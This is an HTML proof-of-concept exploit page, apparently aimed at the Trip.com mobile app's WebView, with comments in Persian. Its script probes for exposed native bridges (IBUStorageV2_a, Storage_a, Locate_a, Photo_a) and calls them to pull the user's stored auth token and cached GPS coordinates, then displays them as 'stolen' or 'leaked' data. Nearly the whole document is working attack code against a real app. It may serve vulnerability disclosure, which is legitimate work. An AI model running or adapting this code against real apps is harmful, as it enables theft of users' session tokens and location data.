<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trip.com Terminal PoC</title>
    <style>
        /* تم ترمینال ساده: پس‌زمینه مشکی، متن سفید */
        body { font-family: 'Consolas', monospace; background: #000; color: #fff; padding: 15px; line-height: 1.4; }
        .card { border: 1px solid #444; padding: 10px; margin-bottom: 15px; background: #000; }
        h3 { margin-top: 0; color: #5bc0de; border-bottom: 1px solid #444; padding-bottom: 5px; font-size: 16px; }
        #logs { font-size: 13px; height: 300px; overflow-y: auto; border: 1px solid #222; padding: 8px; background: #000; color: #fff; }
        .func { color: #f0ad4e; font-weight: bold; } /* رنگ توابع: نارنجی */
        .success { color: #5cb85c; } /* رنگ موفقیت: سبز */
        .error { color: #d9534f; } /* رنگ خطا: قرمز */
        button { width: 100%; padding: 12px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; margin-top: 10px; font-family: monospace; }
        ul { list-style: none; padding: 0; }
        li { margin-bottom: 5px; color: #aaa; }
    </style>
</head>
<body>

    <div class="card">
        <h3>[ BRIDGE STATUS ]</h3>
        <ul id="bridgeStatus">Checking availability...</ul>
    </div>

    <div class="card">
        <h3>[ OUTPUT CONSOLE ]</h3>
        <div id="logs">Ready for deployment.</div>
    </div>

    <button onclick="runExploit()">Execute Payload</button>

    <script>
        function log(msg, type = 'info') {
            const box = document.getElementById('logs');
            let color = "#fff"; // سفید برای توضیحات عادی
            if (type === 'func') color = "#f0ad4e"; // نارنجی برای توابع
            if (type === 'success') color = "#5cb85c"; // سبز برای دیتا
            if (type === 'error') color = "#d9534f"; // قرمز برای خطا
            
            box.innerHTML += `\n<br><span style="color:${color}">> ${msg}</span>`;
            box.scrollTop = box.scrollHeight;
        }

        // شنود بازگشت دیتا طبق کلاس ax0.b
        window.__bridge_callback = function(base64Data) {
            try {
                const decoded = atob(base64Data);
                log("DATABASE RESPONSE RECEIVED", "success");
                log(`DATA: ${decoded}`, "success");
                // اگر دیتا شامل توکن بود، آلرت بده
                if(decoded.includes("token")) alert("CRITICAL DATA STOLEN: " + decoded);
            } catch(e) { log("Callback Error: " + e.message, "error"); }
        };

        async function runExploit() {
            log("Starting extraction sequence...", "info");

            // ۱. ابتدا استخراج دیتابیس (امن‌تر و سریع‌تر)
            if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
                log("Calling <span class='func'>IBUStorageV2_a.IBUGetUserValue()</span>", "func");
                const payload = JSON.stringify({
                    "action": "IBUGetUserValue",
                    "arguments": { "bussiness": "common", "key": "token" },
                    "callback": "__bridge_callback"
                });
                window.IBUStorageV2_a.IBUGetUserValue(payload);
                log("Storage request sent. Waiting...");
            }

            // وقفه برای جلوگیری از هنگ کردن (۱ ثانیه)
            await new Promise(r => setTimeout(r, 1000));

            // ۲. تست Storage عمومی (اگر پل اول جواب نداد)
            if (window.Storage_a && window.Storage_a.get) {
                log("Calling <span class='func'>Storage_a.get()</span>", "func");
                try {
                    const val = window.Storage_a.get("common", "token", "null");
                    if (val !== "null") log(`Found in Storage_a: ${val}`, "success");
                } catch(e) { log("Storage_a fail", "error"); }
            }

            await new Promise(r => setTimeout(r, 1000));

            // ۳. لوکیشن (آخرین مرحله چون سنگین است و ممکن است باعث هنگ شود)
            if (window.Locate_a && window.Locate_a.getCachedLocationData) {
                log("Calling <span class='func'>Locate_a.getCachedLocationData()</span>", "func");
                try {
                    const loc = window.Locate_a.getCachedLocationData();
                    if (loc) {
                        log("GPS DATA LEAKED", "success");
                        log(`Coordinates: ${loc.lat}, ${loc.lng}`, "success");
                    }
                } catch(e) { log("Location call timed out or failed", "error"); }
            }
        }

        // بررسی پل‌ها در لود اولیه
        setTimeout(() => {
            const targets = ["IBUStorageV2_a", "Storage_a", "Locate_a", "Photo_a"];
            const statusBox = document.getElementById('bridgeStatus');
            statusBox.innerHTML = "";
            targets.forEach(t => {
                const found = typeof window[t] !== 'undefined';
                statusBox.innerHTML += `<li>- ${t}: <b style="color:${found ? '#5cb85c' : '#d9534f'}">${found ? 'ONLINE' : 'OFFLINE'}</b></li>`;
            });
            log("System Check Complete.");
        }, 800);
    </script>
</body>
</html>
